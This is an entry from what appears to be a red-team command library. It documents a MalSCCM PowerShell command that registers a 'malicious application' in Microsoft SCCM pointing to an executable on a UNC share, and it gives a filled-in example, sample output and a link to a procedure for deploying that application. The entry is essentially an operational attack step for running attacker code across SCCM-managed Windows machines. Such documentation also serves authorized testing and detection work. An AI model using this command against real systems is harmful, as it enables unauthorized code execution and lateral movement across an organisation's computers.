---
id: 1f88f93f-1ec1-4292-b3da-3f1d4a58892a
type: command
executor: powershell
data: 'MalSCCM.exe app /create /name:$_APP_NAME /uncpath:"\\$_SERVER\$_SHARE\$_EXE"'
output: null
created_at: '2023-04-06T03:56:08.126472+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - sccm
  - execution
verified: true
validated: true
---

# Create-malicious-application-using-MalSCCM

## Command

```powershell
MalSCCM.exe app /create /name:$_APP_NAME /uncpath:"\\$_SERVER\$_SHARE\$_EXE"
```

## Description

Registers a new application in SCCM pointing to a UNC path for the executable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /name:$_APP_NAME | Application name (e.g., demoapp) | Yes |
| /uncpath | UNC path to the executable | Yes |

## Examples

### Basic Usage

```powershell
MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"
```

## Expected Output

Application 'demoapp' created.
App ID: SCOPEID_...

Registration confirmation.

## Related

- [[procedures/Create-and-Deploy-Malicious-Application-via-SCCM]]
